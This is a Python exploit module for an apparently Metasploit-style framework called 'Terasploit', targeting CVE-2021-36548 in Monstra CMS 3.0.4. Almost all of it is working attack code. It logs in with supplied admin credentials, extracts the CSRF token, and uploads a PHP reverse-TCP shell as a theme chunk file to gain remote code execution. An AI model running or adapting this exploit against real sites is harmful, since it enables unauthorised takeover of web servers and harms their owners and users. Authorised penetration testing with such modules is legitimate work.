#######
# Module/Exploit: Monstra CMS Authenticated Remote Code Execution
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.exploit import *

class TerasploitModule(Exploit):
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'License'  : 'Terasploit Framework License (BSD)',
                'Name'     : 'Monstra CMS Authenticated Remote Code Execution',
                'Version'  : '3.0.4',
                'Module'   : Module.exploit,
                'Payload'  : 'modules/payload/php/shell_reverse_tcp',
                'Arch'     : Arch.PHP,
                "Platform" : Platform.PHP,
                'Author'  : [
                    'Charlie <rupture6.dev[at]gmail.com>',
                ],
                'Description' : [
                    'A remote code execution (RCE) vulnerability in the component /admin/index.php?',
                    'id=themes&action=edit_template&filename=blog of Monstra v3.0.4 allows attackers',
                    'to execute arbitrary commands via a crafted PHP file.'
                ],
                'Reference' : [
                    'CVE-2021-36548',
                    'https://nvd.nist.gov/vuln/detail/CVE-2021-36548',
                    'https://www.exploit-db.com/exploits/52038'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('exploit',opt=[
            OptURL.create('rhost',['','yes','the remote host target (url)']),
            OptProxy.create('proxy',['','no','json file containing proxies, json format {"protocol":"proxy",...}']),
            OptBool.create('ssl_verify',['false','no','check ssl certificate on the host']),
            OptString.create('username',['','yes','username to use for authentication']),
            OptString.create('password',['','yes','password to use for authentication'])
        ])


    def login(self) -> bool:
        _, proxy, verify, username, password = self.OPT()
        
        info_print ('Logging in using specified credentials...')
        login_response = HTTP.session.post(
            url=f'{Target.scheme}://{Target.hostname}/admin/index.php?id=dashboard',
            data={'login':username,'password':password,'login_submit':'Log+In'},
            proxies=self.GetProxy(proxy),
            verify=self.GetBoolean(verify)
        )
        
        return True if 'Dashboard' in login_response.text else False


    def csrf_token(self) -> tuple[any,bool]:
        _, proxy, verify, _, _ = self.OPT()
        
        info_print ('Accessing edit page to find CSRF token.')
        edit = HTTP.session.get(
            url=f"{Target.scheme}://{Target.hostname}/admin/index.php?id=themes&action=add_chunk",
            proxies=self.GetProxy(proxy),
            verify=self.GetBoolean(verify)
        )
        
        token_search = re.search(r'input type="hidden" id="csrf" name="csrf" value="(.*?)"',edit.text)
        if token_search:
            return token_search.group(1), True
        else:
            return None, False


    def exploit(self) -> tuple[str,bool]:
        payload, _ = Get.payload()
        target, proxy, verify, _, _ = self.OPT()
        self.ParseURL(target)
        
        shell = self.EncodeShell(payload.generate())
        rand = self.generate_random_name()
        Shell.new(f'{Target.scheme}://{Target.hostname}/public/themes/default/{rand}.chunk.php')
        
        try:
            if self.login():
                token, boolean = self.csrf_token()
                if boolean:
                    exploit = HTTP.session.post(
                        url=f"{Target.scheme}://{Target.hostname}/admin/index.php?id=themes&action=add_chunk",
                        data={'csrf':token,'name':rand,'content':shell,'add_file':'Save'},
                        proxies=self.GetProxy(proxy),
                        verify=self.GetBoolean(verify)
                    )
                    if exploit.status_code in self.good_status_code():
                        info_print (f'Shell uploaded: {Shell.get()}', type="GREEN")
                        return 'session', True
                    else:
                        info_print (f'Exploit failed, status code: {exploit.status_code}',type='red')
                        return 'session', False
                else:
                    info_print ("Exploit failed, can't find CSRF token") 
                    HTTP().new()
                    return 'done', False
            else:
                info_print("Failed to login using specified credentials")
                HTTP().new()
                return 'done', False

        except Exception as error:
            info_print (error,type='red')
            HTTP().new()
            return 'exception', True